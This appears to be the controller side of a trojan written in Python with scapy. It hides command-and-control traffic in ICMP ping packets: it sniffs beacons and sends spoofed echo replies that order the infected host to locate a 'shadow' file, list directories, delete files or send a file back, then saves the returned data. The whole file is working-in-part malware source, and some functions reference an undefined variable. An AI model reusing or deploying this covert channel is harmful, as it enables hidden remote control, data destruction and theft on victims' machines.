from scapy.all import *
from scapy.layers.inet import ICMP, IP

MAX_DATA_SIZE = 1472
ASK_FOR_COMMAND_ID = 230
START_TRANSMISSION_ID = 240
ONGOING_TRANSMISSION_ID = 250
END_TRANSMISSION_ID = 255


def write_string_to_file(filemane, message):
    text_file = open(filemane, "w")
    n = text_file.write(message)
    text_file.close()


def stop_fnc(packet):
    if packet[ICMP] and packet[ICMP].id == END_TRANSMISSION_ID:
        return True
    else:
        return False


"""def display_menu():
    print("Bienvenu sur le trojan master : \n")
    print("1. Testing connection")
    print("2. Delete file")
    print("3. list content of the path")
    print("4. Locate file")
    print("5. Quit!")
    return int(input())"""
def action_locate_file(pkt):
    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                  ICMP(type=0, code=0, id=500, seq=pkt[ICMP].seq) / \
                  Raw(load="shadow")
    send(spoofed_pkt, verbose=False)
def action_list_directory(pkt):
    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                  ICMP(type=0, code=0, id=400, seq=pkt[ICMP].seq) / \
                  Raw(load="./")
    send(spoofed_pkt, verbose=False)
def action_delete_file(pkt):
    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                  ICMP(type=0, code=0, id=300, seq=pkt[ICMP].seq) / \
                  Raw(load="./data.txt")
    send(spoofed_pkt, verbose=False)
def action_send_file(pkt):
    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                  ICMP(type=0, code=0, id=200, seq=pkt[ICMP].seq) / \
                  Raw(load="./data.txt")
    send(spoofed_pkt, verbose=False)

def storage_file(pkt,filename):
    message=""
    file = pkt[1:len(pkt) - 1]
    for raw in file:
        message += packet[ICMP].payload.load.decode("utf-8")
    print(message)
    write_string_to_file(filename, message)

def display_cmd(pkt):
    message=""
    file = pkt[1:len(pkt) - 1]
    for raw in file:
        message += packet[ICMP].payload.load.decode("utf-8")
    print(message)

def default_reply(pkt) :
 spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
              ICMP(type=0, code=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)/\
              Raw(load="alive")
 send(spoofed_pkt, verbose=False)

def spoof_ping_reply(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:
        if pkt[ICMP].id == 210:
            print(" Trojan ping request")
            spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                          ICMP(type=0, code=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / \
                          Raw(load="alive")
            send(spoofed_pkt, verbose=False)

        elif pkt[ICMP].id == 220:
            print(" Start series of actions")
            action_locate_file(pkt)
            default_reply(pkt)

        elif pkt[ICMP].id == 200:
            print("Action 200 delete")
            storage_file(pkt,"data.txt")
            display_cmd(pkt)
            default_reply(pkt)

        elif pkt[ICMP].id == 300:
            print("Action 300")
            display_cmd(pkt)
            default_reply(pkt)

        elif pkt[ICMP].id == 400:
            print("Action 400")
            display_cmd(pkt)
            default_reply(pkt)

        elif pkt[ICMP].id == 500:
            print("Action 500")
            display_cmd(pkt)
            default_reply(pkt)

        else:
            print("Normal ping request detected")
            default_reply(pkt)


if __name__ == '__main__':

    sniff(filter="icmp", prn=spoof_ping_reply)

    """ message = ""
    capture = receive_transmission()
    capture = capture[1:len(capture) - 1]
    for packet in capture:
        message += packet[ICMP].payload.load.decode("utf-8")
    print(message)
    write_string_to_file("data.txt", message)"""


    """while keep_going:
        choice = display_menu()

        choice = choix
        if choice == 1:
        elif choice == 2:
        elif choice == 3:
        elif choice == 4:
        elif choice == 5:
        else:
            print("Wrong Choice!")"""